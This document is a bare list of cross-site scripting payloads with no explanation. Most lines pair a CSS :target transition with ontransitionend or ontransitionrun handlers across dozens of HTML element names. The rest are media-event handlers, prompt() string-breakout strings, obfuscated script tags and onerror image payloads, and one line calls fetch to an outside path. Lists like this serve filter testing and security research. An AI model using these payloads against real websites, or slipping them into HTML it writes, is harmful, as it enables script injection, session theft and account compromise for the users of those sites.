<style>:target {color:red;}</style><base id=x style="transition:color 1s" ontransitionend=alert(1)></base>
<style>:target {color:red;}</style><basefont id=x style="transition:color 1s" ontransitionend=alert(1)></basefont>
<style>:target {color:red;}</style><bdi id=x style="transition:color 1s" ontransitionend=alert(1)></bdi>
<style>:target {color:red;}</style><bdo id=x style="transition:color 1s" ontransitionend=alert(1)></bdo>
<style>:target {color:red;}</style><bgsound id=x style="transition:color 1s" ontransitionend=alert(1)></bgsound>
<style>:target {color:red;}</style><big id=x style="transition:color 1s" ontransitionend=alert(1)></big>
<style>:target {color:red;}</style><blink id=x style="transition:color 1s" ontransitionend=alert(1)></blink>
<style>:target {color:red;}</style><blockquote id=x style="transition:color 1s" ontransitionend=alert(1)></blockquote>
<style>:target {color:red;}</style><body id=x style="transition:color 1s" ontransitionend=alert(1)></body>
<style>:target {color:red;}</style><br id=x style="transition:color 1s" ontransitionend=alert(1)></br>
<style>:target {color:red;}</style><button id=x style="transition:color 1s" ontransitionend=alert(1)></button>
<style>:target {color:red;}</style><canvas id=x style="transition:color 1s" ontransitionend=alert(1)></canvas>
<style>:target {color:red;}</style><caption id=x style="transition:color 1s" ontransitionend=alert(1)></caption>
<style>:target {color:red;}</style><center id=x style="transition:color 1s" ontransitionend=alert(1)></center>
<style>:target {color:red;}</style><cite id=x style="transition:color 1s" ontransitionend=alert(1)></cite>
<style>:target {color:red;}</style><code id=x style="transition:color 1s" ontransitionend=alert(1)></code>
<style>:target {color:red;}</style><col id=x style="transition:color 1s" ontransitionend=alert(1)></col>
<style>:target {color:red;}</style><colgroup id=x style="transition:color 1s" ontransitionend=alert(1)></colgroup>
<style>:target {color:red;}</style><command id=x style="transition:color 1s" ontransitionend=alert(1)></command>
<style>:target {color:red;}</style><content id=x style="transition:color 1s" ontransitionend=alert(1)></content>
<style>:target {color:red;}</style><data id=x style="transition:color 1s" ontransitionend=alert(1)></data>
<style>:target {color:red;}</style><datalist id=x style="transition:color 1s" ontransitionend=alert(1)></datalist>
<style>:target {color:red;}</style><dd id=x style="transition:color 1s" ontransitionend=alert(1)></dd>
<style>:target {color:red;}</style><del id=x style="transition:color 1s" ontransitionend=alert(1)></del>
<style>:target {color:red;}</style><details id=x style="transition:color 1s" ontransitionend=alert(1)></details>
<style>:target {color:red;}</style><dfn id=x style="transition:color 1s" ontransitionend=alert(1)></dfn>
<style>:target {color:red;}</style><dialog id=x style="transition:color 1s" ontransitionend=alert(1)></dialog>
<style>:target {color:red;}</style><dir id=x style="transition:color 1s" ontransitionend=alert(1)></dir>
<style>:target {color:red;}</style><div id=x style="transition:color 1s" ontransitionend=alert(1)></div>
<style>:target {color:red;}</style><dl id=x style="transition:color 1s" ontransitionend=alert(1)></dl>
<style>:target {color:red;}</style><dt id=x style="transition:color 1s" ontransitionend=alert(1)></dt>
<style>:target {color:red;}</style><element id=x style="transition:color 1s" ontransitionend=alert(1)></element>
<style>:target {color:red;}</style><em id=x style="transition:color 1s" ontransitionend=alert(1)></em>
<style>:target {color:red;}</style><embed id=x style="transition:color 1s" ontransitionend=alert(1)></embed>
<style>:target {color:red;}</style><fieldset id=x style="transition:color 1s" ontransitionend=alert(1)></fieldset>
<style>:target {color:red;}</style><figcaption id=x style="transition:color 1s" ontransitionend=alert(1)></figcaption>
<style>:target {color:red;}</style><figure id=x style="transition:color 1s" ontransitionend=alert(1)></figure>
<style>:target {color:red;}</style><font id=x style="transition:color 1s" ontransitionend=alert(1)></font>
<style>:target {color:red;}</style><footer id=x style="transition:color 1s" ontransitionend=alert(1)></footer>
<style>:target {color:red;}</style><form id=x style="transition:color 1s" ontransitionend=alert(1)></form>
<style>:target {color:red;}</style><frame id=x style="transition:color 1s" ontransitionend=alert(1)></frame>
<style>:target {color:red;}</style><frameset id=x style="transition:color 1s" ontransitionend=alert(1)></frameset>
<style>:target {color:red;}</style><h1 id=x style="transition:color 1s" ontransitionend=alert(1)></h1>
<style>:target {color:red;}</style><head id=x style="transition:color 1s" ontransitionend=alert(1)></head>
<style>:target {color:red;}</style><header id=x style="transition:color 1s" ontransitionend=alert(1)></header>
<style>:target {color:red;}</style><hgroup id=x style="transition:color 1s" ontransitionend=alert(1)></hgroup>
<style>:target {color:red;}</style><hr id=x style="transition:color 1s" ontransitionend=alert(1)></hr>
<style>:target {color:red;}</style><html id=x style="transition:color 1s" ontransitionend=alert(1)></html>
<style>:target {color:red;}</style><i id=x style="transition:color 1s" ontransitionend=alert(1)></i>
<style>:target {color:red;}</style><iframe id=x style="transition:color 1s" ontransitionend=alert(1)></iframe>
<style>:target {color:red;}</style><image id=x style="transition:color 1s" ontransitionend=alert(1)></image>
<style>:target {color:red;}</style><img id=x style="transition:color 1s" ontransitionend=alert(1)></img>
<style>:target {color:red;}</style><input id=x style="transition:color 1s" ontransitionend=alert(1)></input>
<style>:target {color:red;}</style><ins id=x style="transition:color 1s" ontransitionend=alert(1)></ins>
<style>:target {color:red;}</style><isindex id=x style="transition:color 1s" ontransitionend=alert(1)></isindex>
<style>:target {color:red;}</style><kbd id=x style="transition:color 1s" ontransitionend=alert(1)></kbd>
<style>:target {color:red;}</style><keygen id=x style="transition:color 1s" ontransitionend=alert(1)></keygen>
<style>:target {color:red;}</style><label id=x style="transition:color 1s" ontransitionend=alert(1)></label>
<style>:target {color:red;}</style><legend id=x style="transition:color 1s" ontransitionend=alert(1)></legend>
<style>:target {color:red;}</style><li id=x style="transition:color 1s" ontransitionend=alert(1)></li>
<style>:target {color:red;}</style><link id=x style="transition:color 1s" ontransitionend=alert(1)></link>
<style>:target {color:red;}</style><listing id=x style="transition:color 1s" ontransitionend=alert(1)></listing>
<style>:target {color:red;}</style><main id=x style="transition:color 1s" ontransitionend=alert(1)></main>
<style>:target {color:red;}</style><map id=x style="transition:color 1s" ontransitionend=alert(1)></map>
<style>:target {color:red;}</style><mark id=x style="transition:color 1s" ontransitionend=alert(1)></mark>
<style>:target {color:red;}</style><marquee id=x style="transition:color 1s" ontransitionend=alert(1)></marquee>
<style>:target {color:red;}</style><menu id=x style="transition:color 1s" ontransitionend=alert(1)></menu>
<style>:target {color:red;}</style><menuitem id=x style="transition:color 1s" ontransitionend=alert(1)></menuitem>
<style>:target {color:red;}</style><meta id=x style="transition:color 1s" ontransitionend=alert(1)></meta>
<style>:target {color:red;}</style><meter id=x style="transition:color 1s" ontransitionend=alert(1)></meter>
<style>:target {color:red;}</style><multicol id=x style="transition:color 1s" ontransitionend=alert(1)></multicol>
<style>:target {color:red;}</style><nav id=x style="transition:color 1s" ontransitionend=alert(1)></nav>
<style>:target {color:red;}</style><nextid id=x style="transition:color 1s" ontransitionend=alert(1)></nextid>
<style>:target {color:red;}</style><nobr id=x style="transition:color 1s" ontransitionend=alert(1)></nobr>
<style>:target {color:red;}</style><noembed id=x style="transition:color 1s" ontransitionend=alert(1)></noembed>
<style>:target {color:red;}</style><noframes id=x style="transition:color 1s" ontransitionend=alert(1)></noframes>
<style>:target {color:red;}</style><noscript id=x style="transition:color 1s" ontransitionend=alert(1)></noscript>
<style>:target {color:red;}</style><object id=x style="transition:color 1s" ontransitionend=alert(1)></object>
<style>:target {color:red;}</style><ol id=x style="transition:color 1s" ontransitionend=alert(1)></ol>
<style>:target {color:red;}</style><optgroup id=x style="transition:color 1s" ontransitionend=alert(1)></optgroup>
<style>:target {color:red;}</style><option id=x style="transition:color 1s" ontransitionend=alert(1)></option>
<style>:target {color:red;}</style><output id=x style="transition:color 1s" ontransitionend=alert(1)></output>
<style>:target {color:red;}</style><p id=x style="transition:color 1s" ontransitionend=alert(1)></p>
<style>:target {color:red;}</style><param id=x style="transition:color 1s" ontransitionend=alert(1)></param>
<style>:target {color:red;}</style><picture id=x style="transition:color 1s" ontransitionend=alert(1)></picture>
<style>:target {color:red;}</style><plaintext id=x style="transition:color 1s" ontransitionend=alert(1)></plaintext>
<style>:target {color:red;}</style><pre id=x style="transition:color 1s" ontransitionend=alert(1)></pre>
<style>:target {color:red;}</style><progress id=x style="transition:color 1s" ontransitionend=alert(1)></progress>
<style>:target {color:red;}</style><q id=x style="transition:color 1s" ontransitionend=alert(1)></q>
<style>:target {color:red;}</style><rb id=x style="transition:color 1s" ontransitionend=alert(1)></rb>
<style>:target {color:red;}</style><rp id=x style="transition:color 1s" ontransitionend=alert(1)></rp>
<style>:target {color:red;}</style><rt id=x style="transition:color 1s" ontransitionend=alert(1)></rt>
<style>:target {color:red;}</style><rtc id=x style="transition:color 1s" ontransitionend=alert(1)></rtc>
<style>:target {color:red;}</style><ruby id=x style="transition:color 1s" ontransitionend=alert(1)></ruby>
<style>:target {color:red;}</style><s id=x style="transition:color 1s" ontransitionend=alert(1)></s>
<style>:target {color:red;}</style><samp id=x style="transition:color 1s" ontransitionend=alert(1)></samp>
<style>:target {color:red;}</style><script id=x style="transition:color 1s" ontransitionend=alert(1)></script>
<style>:target {color:red;}</style><section id=x style="transition:color 1s" ontransitionend=alert(1)></section>
<style>:target {color:red;}</style><select id=x style="transition:color 1s" ontransitionend=alert(1)></select>
<style>:target {color:red;}</style><shadow id=x style="transition:color 1s" ontransitionend=alert(1)></shadow>
<style>:target {color:red;}</style><slot id=x style="transition:color 1s" ontransitionend=alert(1)></slot>
<style>:target {color:red;}</style><small id=x style="transition:color 1s" ontransitionend=alert(1)></small>
<style>:target {color:red;}</style><source id=x style="transition:color 1s" ontransitionend=alert(1)></source>
<style>:target {color:red;}</style><spacer id=x style="transition:color 1s" ontransitionend=alert(1)></spacer>
<style>:target {color:red;}</style><span id=x style="transition:color 1s" ontransitionend=alert(1)></span>
<style>:target {color:red;}</style><strike id=x style="transition:color 1s" ontransitionend=alert(1)></strike>
<style>:target {color:red;}</style><strong id=x style="transition:color 1s" ontransitionend=alert(1)></strong>
<style>:target {color:red;}</style><style id=x style="transition:color 1s" ontransitionend=alert(1)></style>
<style>:target {color:red;}</style><sub id=x style="transition:color 1s" ontransitionend=alert(1)></sub>
<style>:target {color:red;}</style><summary id=x style="transition:color 1s" ontransitionend=alert(1)></summary>
<style>:target {color:red;}</style><sup id=x style="transition:color 1s" ontransitionend=alert(1)></sup>
<style>:target {color:red;}</style><svg id=x style="transition:color 1s" ontransitionend=alert(1)></svg>
<style>:target {color:red;}</style><table id=x style="transition:color 1s" ontransitionend=alert(1)></table>
<style>:target {color:red;}</style><tbody id=x style="transition:color 1s" ontransitionend=alert(1)></tbody>
<style>:target {color:red;}</style><td id=x style="transition:color 1s" ontransitionend=alert(1)></td>
<style>:target {color:red;}</style><template id=x style="transition:color 1s" ontransitionend=alert(1)></template>
<style>:target {color:red;}</style><textarea id=x style="transition:color 1s" ontransitionend=alert(1)></textarea>
<style>:target {color:red;}</style><tfoot id=x style="transition:color 1s" ontransitionend=alert(1)></tfoot>
<style>:target {color:red;}</style><th id=x style="transition:color 1s" ontransitionend=alert(1)></th>
<style>:target {color:red;}</style><thead id=x style="transition:color 1s" ontransitionend=alert(1)></thead>
<style>:target {color:red;}</style><time id=x style="transition:color 1s" ontransitionend=alert(1)></time>
<style>:target {color:red;}</style><title id=x style="transition:color 1s" ontransitionend=alert(1)></title>
<style>:target {color:red;}</style><tr id=x style="transition:color 1s" ontransitionend=alert(1)></tr>
<style>:target {color:red;}</style><track id=x style="transition:color 1s" ontransitionend=alert(1)></track>
<style>:target {color:red;}</style><tt id=x style="transition:color 1s" ontransitionend=alert(1)></tt>
<style>:target {color:red;}</style><u id=x style="transition:color 1s" ontransitionend=alert(1)></u>
<style>:target {color:red;}</style><ul id=x style="transition:color 1s" ontransitionend=alert(1)></ul>
<style>:target {color:red;}</style><var id=x style="transition:color 1s" ontransitionend=alert(1)></var>
<style>:target {color:red;}</style><video id=x style="transition:color 1s" ontransitionend=alert(1)></video>
<style>:target {color:red;}</style><wbr id=x style="transition:color 1s" ontransitionend=alert(1)></wbr>
<style>:target {color:red;}</style><xmp id=x style="transition:color 1s" ontransitionend=alert(1)></xmp>
<style>:target {color:red;}</style><xmp id=x style="transition:color 1s" ontransitionend=alert(1)></xmp>
<style>:target {transform: rotate(180deg);}</style><a id=x style="transition:transform 2s" ontransitionrun=alert(1)></a>
<style>:target {transform: rotate(180deg);}</style><abbr id=x style="transition:transform 2s" ontransitionrun=alert(1)></abbr>
<style>:target {transform: rotate(180deg);}</style><acronym id=x style="transition:transform 2s" ontransitionrun=alert(1)></acronym>
<style>:target {transform: rotate(180deg);}</style><address id=x style="transition:transform 2s" ontransitionrun=alert(1)></address>
<style>:target {transform: rotate(180deg);}</style><applet id=x style="transition:transform 2s" ontransitionrun=alert(1)></applet>
<style>:target {transform: rotate(180deg);}</style><area id=x style="transition:transform 2s" ontransitionrun=alert(1)></area>
<style>:target {transform: rotate(180deg);}</style><article id=x style="transition:transform 2s" ontransitionrun=alert(1)></article>
<style>:target {transform: rotate(180deg);}</style><aside id=x style="transition:transform 2s" ontransitionrun=alert(1)></aside>
<style>:target {transform: rotate(180deg);}</style><audio id=x style="transition:transform 2s" ontransitionrun=alert(1)></audio>
<style>:target {transform: rotate(180deg);}</style><b id=x style="transition:transform 2s" ontransitionrun=alert(1)></b>
<style>:target {transform: rotate(180deg);}</style><base id=x style="transition:transform 2s" ontransitionrun=alert(1)></base>
<style>:target {transform: rotate(180deg);}</style><basefont id=x style="transition:transform 2s" ontransitionrun=alert(1)></basefont>
<style>:target {transform: rotate(180deg);}</style><bdi id=x style="transition:transform 2s" ontransitionrun=alert(1)></bdi>
<style>:target {transform: rotate(180deg);}</style><bdo id=x style="transition:transform 2s" ontransitionrun=alert(1)></bdo>
<style>:target {transform: rotate(180deg);}</style><bgsound id=x style="transition:transform 2s" ontransitionrun=alert(1)></bgsound>
<style>:target {transform: rotate(180deg);}</style><big id=x style="transition:transform 2s" ontransitionrun=alert(1)></big>
<style>:target {transform: rotate(180deg);}</style><blink id=x style="transition:transform 2s" ontransitionrun=alert(1)></blink>
<style>:target {transform: rotate(180deg);}</style><blockquote id=x style="transition:transform 2s" ontransitionrun=alert(1)></blockquote>
<style>:target {transform: rotate(180deg);}</style><body id=x style="transition:transform 2s" ontransitionrun=alert(1)></body>
<style>:target {transform: rotate(180deg);}</style><br id=x style="transition:transform 2s" ontransitionrun=alert(1)></br>
<style>:target {transform: rotate(180deg);}</style><button id=x style="transition:transform 2s" ontransitionrun=alert(1)></button>
<style>:target {transform: rotate(180deg);}</style><canvas id=x style="transition:transform 2s" ontransitionrun=alert(1)></canvas>
<style>:target {transform: rotate(180deg);}</style><caption id=x style="transition:transform 2s" ontransitionrun=alert(1)></caption>
<style>:target {transform: rotate(180deg);}</style><center id=x style="transition:transform 2s" ontransitionrun=alert(1)></center>
<style>:target {transform: rotate(180deg);}</style><cite id=x style="transition:transform 2s" ontransitionrun=alert(1)></cite>
<style>:target {transform: rotate(180deg);}</style><code id=x style="transition:transform 2s" ontransitionrun=alert(1)></code>
<style>:target {transform: rotate(180deg);}</style><col id=x style="transition:transform 2s" ontransitionrun=alert(1)></col>
<style>:target {transform: rotate(180deg);}</style><colgroup id=x style="transition:transform 2s" ontransitionrun=alert(1)></colgroup>
<style>:target {transform: rotate(180deg);}</style><command id=x style="transition:transform 2s" ontransitionrun=alert(1)></command>
<style>:target {transform: rotate(180deg);}</style><content id=x style="transition:transform 2s" ontransitionrun=alert(1)></content>
<style>:target {transform: rotate(180deg);}</style><data id=x style="transition:transform 2s" ontransitionrun=alert(1)></data>
<style>:target {transform: rotate(180deg);}</style><datalist id=x style="transition:transform 2s" ontransitionrun=alert(1)></datalist>
<style>:target {transform: rotate(180deg);}</style><dd id=x style="transition:transform 2s" ontransitionrun=alert(1)></dd>
<style>:target {transform: rotate(180deg);}</style><del id=x style="transition:transform 2s" ontransitionrun=alert(1)></del>
<style>:target {transform: rotate(180deg);}</style><details id=x style="transition:transform 2s" ontransitionrun=alert(1)></details>
<style>:target {transform: rotate(180deg);}</style><dfn id=x style="transition:transform 2s" ontransitionrun=alert(1)></dfn>
<style>:target {transform: rotate(180deg);}</style><dialog id=x style="transition:transform 2s" ontransitionrun=alert(1)></dialog>
<style>:target {transform: rotate(180deg);}</style><dir id=x style="transition:transform 2s" ontransitionrun=alert(1)></dir>
<style>:target {transform: rotate(180deg);}</style><div id=x style="transition:transform 2s" ontransitionrun=alert(1)></div>
<style>:target {transform: rotate(180deg);}</style><dl id=x style="transition:transform 2s" ontransitionrun=alert(1)></dl>
<style>:target {transform: rotate(180deg);}</style><dt id=x style="transition:transform 2s" ontransitionrun=alert(1)></dt>
<style>:target {transform: rotate(180deg);}</style><element id=x style="transition:transform 2s" ontransitionrun=alert(1)></element>
<style>:target {transform: rotate(180deg);}</style><em id=x style="transition:transform 2s" ontransitionrun=alert(1)></em>
<style>:target {transform: rotate(180deg);}</style><embed id=x style="transition:transform 2s" ontransitionrun=alert(1)></embed>
<style>:target {transform: rotate(180deg);}</style><fieldset id=x style="transition:transform 2s" ontransitionrun=alert(1)></fieldset>
<style>:target {transform: rotate(180deg);}</style><figcaption id=x style="transition:transform 2s" ontransitionrun=alert(1)></figcaption>
<style>:target {transform: rotate(180deg);}</style><figure id=x style="transition:transform 2s" ontransitionrun=alert(1)></figure>
<style>:target {transform: rotate(180deg);}</style><font id=x style="transition:transform 2s" ontransitionrun=alert(1)></font>
<style>:target {transform: rotate(180deg);}</style><footer id=x style="transition:transform 2s" ontransitionrun=alert(1)></footer>
<style>:target {transform: rotate(180deg);}</style><form id=x style="transition:transform 2s" ontransitionrun=alert(1)></form>
<style>:target {transform: rotate(180deg);}</style><frame id=x style="transition:transform 2s" ontransitionrun=alert(1)></frame>
<style>:target {transform: rotate(180deg);}</style><frameset id=x style="transition:transform 2s" ontransitionrun=alert(1)></frameset>
<style>:target {transform: rotate(180deg);}</style><h1 id=x style="transition:transform 2s" ontransitionrun=alert(1)></h1>
<style>:target {transform: rotate(180deg);}</style><head id=x style="transition:transform 2s" ontransitionrun=alert(1)></head>
<style>:target {transform: rotate(180deg);}</style><header id=x style="transition:transform 2s" ontransitionrun=alert(1)></header>
<style>:target {transform: rotate(180deg);}</style><hgroup id=x style="transition:transform 2s" ontransitionrun=alert(1)></hgroup>
<style>:target {transform: rotate(180deg);}</style><hr id=x style="transition:transform 2s" ontransitionrun=alert(1)></hr>
<style>:target {transform: rotate(180deg);}</style><html id=x style="transition:transform 2s" ontransitionrun=alert(1)></html>
<style>:target {transform: rotate(180deg);}</style><i id=x style="transition:transform 2s" ontransitionrun=alert(1)></i>
<style>:target {transform: rotate(180deg);}</style><iframe id=x style="transition:transform 2s" ontransitionrun=alert(1)></iframe>
<style>:target {transform: rotate(180deg);}</style><image id=x style="transition:transform 2s" ontransitionrun=alert(1)></image>
<style>:target {transform: rotate(180deg);}</style><img id=x style="transition:transform 2s" ontransitionrun=alert(1)></img>
<style>:target {transform: rotate(180deg);}</style><input id=x style="transition:transform 2s" ontransitionrun=alert(1)></input>
<style>:target {transform: rotate(180deg);}</style><ins id=x style="transition:transform 2s" ontransitionrun=alert(1)></ins>
<style>:target {transform: rotate(180deg);}</style><isindex id=x style="transition:transform 2s" ontransitionrun=alert(1)></isindex>
<style>:target {transform: rotate(180deg);}</style><kbd id=x style="transition:transform 2s" ontransitionrun=alert(1)></kbd>
<style>:target {transform: rotate(180deg);}</style><keygen id=x style="transition:transform 2s" ontransitionrun=alert(1)></keygen>
<style>:target {transform: rotate(180deg);}</style><label id=x style="transition:transform 2s" ontransitionrun=alert(1)></label>
<style>:target {transform: rotate(180deg);}</style><legend id=x style="transition:transform 2s" ontransitionrun=alert(1)></legend>
<style>:target {transform: rotate(180deg);}</style><li id=x style="transition:transform 2s" ontransitionrun=alert(1)></li>
<style>:target {transform: rotate(180deg);}</style><link id=x style="transition:transform 2s" ontransitionrun=alert(1)></link>
<style>:target {transform: rotate(180deg);}</style><listing id=x style="transition:transform 2s" ontransitionrun=alert(1)></listing>
<style>:target {transform: rotate(180deg);}</style><main id=x style="transition:transform 2s" ontransitionrun=alert(1)></main>
<style>:target {transform: rotate(180deg);}</style><map id=x style="transition:transform 2s" ontransitionrun=alert(1)></map>
<style>:target {transform: rotate(180deg);}</style><mark id=x style="transition:transform 2s" ontransitionrun=alert(1)></mark>
<style>:target {transform: rotate(180deg);}</style><marquee id=x style="transition:transform 2s" ontransitionrun=alert(1)></marquee>
<style>:target {transform: rotate(180deg);}</style><menu id=x style="transition:transform 2s" ontransitionrun=alert(1)></menu>
<style>:target {transform: rotate(180deg);}</style><menuitem id=x style="transition:transform 2s" ontransitionrun=alert(1)></menuitem>
<style>:target {transform: rotate(180deg);}</style><meta id=x style="transition:transform 2s" ontransitionrun=alert(1)></meta>
<style>:target {transform: rotate(180deg);}</style><meter id=x style="transition:transform 2s" ontransitionrun=alert(1)></meter>
<style>:target {transform: rotate(180deg);}</style><multicol id=x style="transition:transform 2s" ontransitionrun=alert(1)></multicol>
<style>:target {transform: rotate(180deg);}</style><nav id=x style="transition:transform 2s" ontransitionrun=alert(1)></nav>
<style>:target {transform: rotate(180deg);}</style><nextid id=x style="transition:transform 2s" ontransitionrun=alert(1)></nextid>
<style>:target {transform: rotate(180deg);}</style><nobr id=x style="transition:transform 2s" ontransitionrun=alert(1)></nobr>
<style>:target {transform: rotate(180deg);}</style><noembed id=x style="transition:transform 2s" ontransitionrun=alert(1)></noembed>
<style>:target {transform: rotate(180deg);}</style><noframes id=x style="transition:transform 2s" ontransitionrun=alert(1)></noframes>
<style>:target {transform: rotate(180deg);}</style><noscript id=x style="transition:transform 2s" ontransitionrun=alert(1)></noscript>
<style>:target {transform: rotate(180deg);}</style><object id=x style="transition:transform 2s" ontransitionrun=alert(1)></object>
<style>:target {transform: rotate(180deg);}</style><ol id=x style="transition:transform 2s" ontransitionrun=alert(1)></ol>
<style>:target {transform: rotate(180deg);}</style><optgroup id=x style="transition:transform 2s" ontransitionrun=alert(1)></optgroup>
<style>:target {transform: rotate(180deg);}</style><option id=x style="transition:transform 2s" ontransitionrun=alert(1)></option>
<style>:target {transform: rotate(180deg);}</style><output id=x style="transition:transform 2s" ontransitionrun=alert(1)></output>
<style>:target {transform: rotate(180deg);}</style><p id=x style="transition:transform 2s" ontransitionrun=alert(1)></p>
<style>:target {transform: rotate(180deg);}</style><param id=x style="transition:transform 2s" ontransitionrun=alert(1)></param>
<style>:target {transform: rotate(180deg);}</style><picture id=x style="transition:transform 2s" ontransitionrun=alert(1)></picture>
<style>:target {transform: rotate(180deg);}</style><plaintext id=x style="transition:transform 2s" ontransitionrun=alert(1)></plaintext>
<style>:target {transform: rotate(180deg);}</style><pre id=x style="transition:transform 2s" ontransitionrun=alert(1)></pre>
<style>:target {transform: rotate(180deg);}</style><progress id=x style="transition:transform 2s" ontransitionrun=alert(1)></progress>
<style>:target {transform: rotate(180deg);}</style><q id=x style="transition:transform 2s" ontransitionrun=alert(1)></q>
<style>:target {transform: rotate(180deg);}</style><rb id=x style="transition:transform 2s" ontransitionrun=alert(1)></rb>
<style>:target {transform: rotate(180deg);}</style><rp id=x style="transition:transform 2s" ontransitionrun=alert(1)></rp>
<style>:target {transform: rotate(180deg);}</style><rt id=x style="transition:transform 2s" ontransitionrun=alert(1)></rt>
<style>:target {transform: rotate(180deg);}</style><rtc id=x style="transition:transform 2s" ontransitionrun=alert(1)></rtc>
<style>:target {transform: rotate(180deg);}</style><ruby id=x style="transition:transform 2s" ontransitionrun=alert(1)></ruby>
<style>:target {transform: rotate(180deg);}</style><s id=x style="transition:transform 2s" ontransitionrun=alert(1)></s>
<style>:target {transform: rotate(180deg);}</style><samp id=x style="transition:transform 2s" ontransitionrun=alert(1)></samp>
<style>:target {transform: rotate(180deg);}</style><script id=x style="transition:transform 2s" ontransitionrun=alert(1)></script>
<style>:target {transform: rotate(180deg);}</style><section id=x style="transition:transform 2s" ontransitionrun=alert(1)></section>
<style>:target {transform: rotate(180deg);}</style><select id=x style="transition:transform 2s" ontransitionrun=alert(1)></select>
<style>:target {transform: rotate(180deg);}</style><shadow id=x style="transition:transform 2s" ontransitionrun=alert(1)></shadow>
<style>:target {transform: rotate(180deg);}</style><slot id=x style="transition:transform 2s" ontransitionrun=alert(1)></slot>
<style>:target {transform: rotate(180deg);}</style><small id=x style="transition:transform 2s" ontransitionrun=alert(1)></small>
<style>:target {transform: rotate(180deg);}</style><source id=x style="transition:transform 2s" ontransitionrun=alert(1)></source>
<style>:target {transform: rotate(180deg);}</style><spacer id=x style="transition:transform 2s" ontransitionrun=alert(1)></spacer>
<style>:target {transform: rotate(180deg);}</style><span id=x style="transition:transform 2s" ontransitionrun=alert(1)></span>
<style>:target {transform: rotate(180deg);}</style><strike id=x style="transition:transform 2s" ontransitionrun=alert(1)></strike>
<style>:target {transform: rotate(180deg);}</style><strong id=x style="transition:transform 2s" ontransitionrun=alert(1)></strong>
<style>:target {transform: rotate(180deg);}</style><style id=x style="transition:transform 2s" ontransitionrun=alert(1)></style>
<style>:target {transform: rotate(180deg);}</style><sub id=x style="transition:transform 2s" ontransitionrun=alert(1)></sub>
<style>:target {transform: rotate(180deg);}</style><summary id=x style="transition:transform 2s" ontransitionrun=alert(1)></summary>
<style>:target {transform: rotate(180deg);}</style><sup id=x style="transition:transform 2s" ontransitionrun=alert(1)></sup>
<style>:target {transform: rotate(180deg);}</style><svg id=x style="transition:transform 2s" ontransitionrun=alert(1)></svg>
<style>:target {transform: rotate(180deg);}</style><table id=x style="transition:transform 2s" ontransitionrun=alert(1)></table>
<style>:target {transform: rotate(180deg);}</style><tbody id=x style="transition:transform 2s" ontransitionrun=alert(1)></tbody>
<style>:target {transform: rotate(180deg);}</style><td id=x style="transition:transform 2s" ontransitionrun=alert(1)></td>
<style>:target {transform: rotate(180deg);}</style><template id=x style="transition:transform 2s" ontransitionrun=alert(1)></template>
<style>:target {transform: rotate(180deg);}</style><textarea id=x style="transition:transform 2s" ontransitionrun=alert(1)></textarea>
<style>:target {transform: rotate(180deg);}</style><tfoot id=x style="transition:transform 2s" ontransitionrun=alert(1)></tfoot>
<style>:target {transform: rotate(180deg);}</style><th id=x style="transition:transform 2s" ontransitionrun=alert(1)></th>
<style>:target {transform: rotate(180deg);}</style><thead id=x style="transition:transform 2s" ontransitionrun=alert(1)></thead>
<style>:target {transform: rotate(180deg);}</style><time id=x style="transition:transform 2s" ontransitionrun=alert(1)></time>
<style>:target {transform: rotate(180deg);}</style><title id=x style="transition:transform 2s" ontransitionrun=alert(1)></title>
<style>:target {transform: rotate(180deg);}</style><tr id=x style="transition:transform 2s" ontransitionrun=alert(1)></tr>
<style>:target {transform: rotate(180deg);}</style><track id=x style="transition:transform 2s" ontransitionrun=alert(1)></track>
<style>:target {transform: rotate(180deg);}</style><tt id=x style="transition:transform 2s" ontransitionrun=alert(1)></tt>
<style>:target {transform: rotate(180deg);}</style><u id=x style="transition:transform 2s" ontransitionrun=alert(1)></u>
<style>:target {transform: rotate(180deg);}</style><ul id=x style="transition:transform 2s" ontransitionrun=alert(1)></ul>
<style>:target {transform: rotate(180deg);}</style><var id=x style="transition:transform 2s" ontransitionrun=alert(1)></var>
<style>:target {transform: rotate(180deg);}</style><video id=x style="transition:transform 2s" ontransitionrun=alert(1)></video>
<style>:target {transform: rotate(180deg);}</style><wbr id=x style="transition:transform 2s" ontransitionrun=alert(1)></wbr>
<style>:target {transform: rotate(180deg);}</style><xmp id=x style="transition:transform 2s" ontransitionrun=alert(1)></xmp>
<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=alert(1)></xss>
<body onunhandledrejection=alert(1)><script>fetch('//xyz')<\/script>
<video autoplay controls onvolumechange=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<video autoplay controls onwaiting=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
<body onwheel=alert(1)>
"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
';a=prompt,a()//
'-eval("window['pro'%2B'mpt'](8)")-'
"-eval("window['pro'%2B'mpt'](8)")-"
"onclick=prompt(8)>"@x.y
"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
<image/src/onerror=prompt(8)>
<img/src/onerror=prompt(8)>
<image src/onerror=prompt(8)>
<img src/onerror=prompt(8)>
<image src =q onerror=prompt(8)>
<img src =q onerror=prompt(8)>
</scrip</script>t><img src =q onerror=prompt(8)>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
